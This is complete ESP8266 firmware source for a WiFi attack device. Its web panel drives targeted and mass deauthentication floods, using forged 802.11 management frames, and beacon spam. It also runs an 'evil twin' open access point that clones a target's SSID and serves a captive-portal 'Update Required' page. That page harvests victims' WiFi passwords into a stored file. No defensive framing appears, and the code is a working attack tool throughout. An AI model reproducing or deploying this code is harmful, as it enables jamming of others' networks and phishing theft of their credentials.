#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

#define LED_PIN 2 

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  int clients;
  bool selected; 
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[32]; 
int networksCount = 0;
String _eventLogs = "";

// Status Flags
bool hotspot_active = false;
bool deauthing_active = false;
bool mass_deauth = false;
bool beacon_spam = false;
bool hidden_ssid = false; 
bool pass_captured = false;

// Config
String config_ssid = "GMpro2"; 
String config_pass = "Sangkur87";
String captured_pass = "";
int beacon_count = 10;
unsigned long lastAttackTime = 0;

void addLog(String msg) {
  String entry = "[" + String(millis()/1000) + "s] " + msg;
  _eventLogs = entry + "\n" + _eventLogs;
  if (_eventLogs.length() > 1000) _eventLogs = _eventLogs.substring(0, 1000);
}

void saveConfig() {
  File f = LittleFS.open("/config.txt", "w");
  if (f) {
    f.println(config_ssid);
    f.println(config_pass);
    f.println(hidden_ssid ? "1" : "0");
    f.close();
    addLog("Config Saved.");
  }
}

void loadConfig() {
  if (LittleFS.exists("/config.txt")) {
    File f = LittleFS.open("/config.txt", "r");
    if (f) {
      config_ssid = f.readStringUntil('\n'); config_ssid.trim();
      config_pass = f.readStringUntil('\n'); config_pass.trim();
      String h = f.readStringUntil('\n'); h.trim();
      hidden_ssid = (h == "1");
      f.close();
    }
  }
}

void performScan() {
  addLog("Scanning...");
  wifi_promiscuous_enable(0);
  int n = WiFi.scanNetworks(false, true); 
  networksCount = 0;
  if (n >= 0) {
    for (int i = 0; i < n && networksCount < 32; ++i) {
      String s = WiFi.SSID(i);
      if (s.length() == 0) s = "*HIDDEN*";
      bool isDup = false;
      for(int k=0; k<networksCount; k++) {
        if(_networks[k].ssid == s) { isDup = true; break; }
      }
      if(isDup) continue;
      _networks[networksCount].ssid = s;
      memcpy(_networks[networksCount].bssid, WiFi.BSSID(i), 6);
      _networks[networksCount].ch = WiFi.channel(i);
      _networks[networksCount].rssi = WiFi.RSSI(i);
      _networks[networksCount].selected = false;
      networksCount++;
    }
    addLog("Found: " + String(networksCount));
  }
  wifi_promiscuous_enable(1);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// --- ATTACK FUNCTIONS ---
void sendDeauth(uint8_t* bssid, uint8_t ch) {
  uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
  memcpy(&pkt[10], bssid, 6); memcpy(&pkt[16], bssid, 6);
  wifi_set_channel(ch);
  wifi_send_pkt_freedom(pkt, 26, 0);
  yield();
}

void sendBeacon(String ssid, uint8_t ch) {
  uint8_t pkt[128] = {0};
  int ptr = 0;
  pkt[ptr++] = 0x80; pkt[ptr++] = 0x00; pkt[ptr++] = 0x00; pkt[ptr++] = 0x00;
  memset(&pkt[ptr], 0xFF, 6); ptr+=6;
  pkt[ptr++] = 0x00; pkt[ptr++] = 0x01; pkt[ptr++] = 0x02; 
  pkt[ptr++] = random(256); pkt[ptr++] = random(256); pkt[ptr++] = random(256);
  memcpy(&pkt[16], &pkt[10], 6); ptr+=6;
  ptr += 14; 
  pkt[ptr++] = 0; pkt[ptr++] = ssid.length();
  memcpy(&pkt[ptr], ssid.c_str(), ssid.length()); ptr += ssid.length();
  pkt[ptr++] = 3; pkt[ptr++] = 1; pkt[ptr++] = ch;
  wifi_set_channel(ch);
  wifi_send_pkt_freedom(pkt, ptr, 0);
  yield();
}

// --- ADMIN & FILE MANAGER ---
void handleAdmin() {
  if (webServer.hasArg("scan")) performScan();
  if (webServer.hasArg("deselect_all")) { for(int i=0; i<32; i++) _networks[i].selected = false; }
  if (webServer.hasArg("ap")) {
    String target = webServer.arg("ap");
    for (int i = 0; i < networksCount; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == target) _networks[i].selected = !_networks[i].selected;
    }
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
  if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "1");
  if (webServer.hasArg("spam")) beacon_spam = (webServer.arg("spam") == "1");
  
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "1");
    if (hotspot_active) {
      String tSSID = "FreeWiFi"; int tCH = 1;
      for(int i=0; i<networksCount; i++) { if(_networks[i].selected) { tSSID = _networks[i].ssid; tCH = _networks[i].ch; break; } }
      WiFi.softAPdisconnect();
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(tSSID.c_str(), "", tCH, false);
      addLog("ET Active: " + tSSID);
    } else {
      WiFi.softAPdisconnect();
      WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
    }
  }

  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><title>GMpro87</title><style>";
  html += "body { font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff00; padding: 10px; }";
  html += ".content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 10px; }";
  html += ".tabs { display: flex; gap: 2px; margin-bottom: 10px; }";
  html += ".tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 8px; cursor: pointer; }";
  html += ".active-btn { background: #00ff00 !important; color: #000 !important; }";
  html += ".tab-content { display: none; } .show { display: block; }";
  html += "table { width: 100%; border-collapse: collapse; font-size: 11px; } td, th { border: 1px solid #00ff00; padding: 4px; text-align: center; }";
  html += ".btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 6px; cursor: pointer; width: 100%; display:block; text-decoration:none; margin: 2px 0; text-align:center; font-size:12px;}";
  html += "input, textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; margin: 5px 0;}";
  html += "</style></head><body><div class='content'><h2>GMpro87</h2>";
  
  if(hotspot_active) html += "<div style='color:red; text-align:center;'>[ EVIL TWIN ACTIVE ]</div>";

  html += "<div class='tabs'><button id='btn-m' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-f' onclick='openTab(\"f\")'>FILES</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
  
  // MAIN
  html += "<div id='m' class='tab-content show'>";
  html += "<div style='display:flex;gap:5px;'><a href='/admin?deauth=" + String(!deauthing_active) + "' class='btn' style='flex:1'>" + (deauthing_active?"STOP DEAUTH":"START DEAUTH") + "</a>";
  html += "<a href='/admin?hotspot=" + String(!hotspot_active) + "' class='btn' style='flex:1'>" + (hotspot_active?"STOP ETWIN":"START ETWIN") + "</a></div>";
  html += "<a href='/admin?scan=1' class='btn' style='background:#333;'>SCAN NETWORKS</a>";
  html += "<a href='/admin?deselect_all=1' class='btn'>DESELECT ALL TARGET</a>";
  html += "<table><tr><th>SSID</th><th>CH</th><th>SEL</th></tr>";
  for(int i=0; i<networksCount; i++) {
    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td>";
    html += "<td><a href='/admin?ap=" + bytesToStr(_networks[i].bssid, 6) + "' class='btn' " + (_networks[i].selected ?"style='background:#0f0;color:#000;'":"") + ">" + (_networks[i].selected ? "L" : "S") + "</a></td></tr>";
  }
  html += "</table></div>";

  // ATTACK
  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3>";
  html += "<a href='/admin?mass=" + String(!mass_deauth) + "' class='btn'>" + (mass_deauth?"STOP MASS":"START MASS") + "</a>";
  html += "<a href='/admin?spam=" + String(!beacon_spam) + "' class='btn'>" + (beacon_spam?"STOP BEACON":"START BEACON") + "</a></div>";

  // FILE MANAGER (New)
  html += "<div id='f' class='tab-content'><h3>File Manager</h3>";
  html += "<form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='upload'><input type='submit' value='UPLOAD HTML' class='btn'></form><hr>";
  html += "<h4>Stored Files:</h4>";
  Dir dir = LittleFS.openDir("/");
  while (dir.next()) {
    html += "<div style='display:flex;justify-content:space-between;border-bottom:1px solid #050;padding:2px;'><span>" + dir.fileName() + "</span>";
    html += "<a href='" + dir.fileName() + "' target='_blank' style='color:#0f0'>PREVIEW</a></div>";
  }
  html += "</div>";

  // SETTING
  html += "<div id='s' class='tab-content'><h3>Config</h3><form action='/admin' method='POST'>";
  html += "Admin SSID: <input type='text' name='admin_ssid' value='"+config_ssid+"'>";
  html += "Admin Pass: <input type='text' name='admin_pass' value='"+config_pass+"'>";
  html += "<button type='submit' name='save_conf' value='1' class='btn'>SAVE & RESTART</button></form></div>";

  html += "<h4>Logs</h4><textarea rows='6' readonly>" + _eventLogs + "</textarea>";
  html += "</div><script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.getElementById(t).classList.add('show');}</script></body></html>";
  
  webServer.send(200, "text/html", html);
}

void handleRoot() {
  if (hotspot_active) {
    if (webServer.hasArg("password")) {
      captured_pass = webServer.arg("password");
      pass_captured = true;
      addLog("!!! CAPTURED: " + captured_pass);
      File f = LittleFS.open("/passwords.txt", "a");
      if(f) { f.println("PASS: " + captured_pass); f.close(); }
      webServer.send(200, "text/html", "Verifying... Please wait.");
    } else {
      // Default ET page if no etwin.html uploaded
      if (LittleFS.exists("/etwin.html")) {
        File f = LittleFS.open("/etwin.html", "r");
        webServer.streamFile(f, "text/html");
        f.close();
      } else {
        webServer.send(200, "text/html", "<h2>Update Required</h2><form method='POST'>Password: <input type='password' name='password'><input type='submit' value='Update'></form>");
      }
    }
  } else { handleAdmin(); }
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  loadConfig();
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.on("/", handleRoot);
  webServer.on("/admin", handleAdmin);
  webServer.on("/upload", HTTP_POST, [](){ webServer.send(200, "text/html", "Upload Success. <a href='/admin'>Back</a>"); }, [](){
    HTTPUpload& upload = webServer.upload();
    if(upload.status == UPLOAD_FILE_START){
      String filename = upload.filename;
      if(!filename.startsWith("/")) filename = "/"+filename;
      webServer._tempFile = LittleFS.open(filename, "w");
    } else if(upload.status == UPLOAD_FILE_WRITE){
      if(webServer._tempFile) webServer._tempFile.write(upload.buf, upload.currentSize);
    } else if(upload.status == UPLOAD_FILE_END){
      if(webServer._tempFile) webServer._tempFile.close();
    }
  });

  // Previewer
  webServer.onNotFound([](){
    if (LittleFS.exists(webServer.uri())) {
      File f = LittleFS.open(webServer.uri(), "r");
      webServer.streamFile(f, "text/html");
      f.close();
    } else { handleRoot(); }
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  yield();
  unsigned long now = millis();
  if (now - lastAttackTime > 100) {
    lastAttackTime = now;
    if (beacon_spam) {
       for(int i=0; i < networksCount && i < 5; i++) {
        if(_networks[i].ssid != "*HIDDEN*") sendBeacon(_networks[i].ssid, _networks[i].ch);
       }
    }
    if (deauthing_active || mass_deauth) {
      for(int i=0; i < networksCount; i++) {
        if (mass_deauth || (deauthing_active && _networks[i].selected)) {
          sendDeauth(_networks[i].bssid, _networks[i].ch);
        }
      }
    }
  }
}
